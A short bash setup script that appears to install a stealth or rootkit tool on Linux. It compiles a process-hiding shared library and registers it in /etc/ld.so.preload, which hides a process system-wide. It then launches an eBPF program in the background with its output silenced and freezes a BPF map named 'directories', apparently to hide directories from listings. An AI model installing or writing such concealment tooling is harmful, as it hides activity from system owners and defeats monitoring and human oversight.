#!/bin/bash

make

# sleep 5

gcc -Wall -fPIC -shared -o src/processhiding/libprocesshider.so src/processhiding/processhider.c -ldl
sudo mv src/processhiding/libprocesshider.so /usr/local/lib/
echo "/usr/local/lib/libprocesshider.so" >> /etc/ld.so.preload


# echo "this"
nohup sudo ./src/eBPF_ls src/config.yaml >/dev/null 2>&1 &
echo $!
sleep 5
# disown $!
# sleep 30
# echo "that"
sudo bpftool map freeze name directories
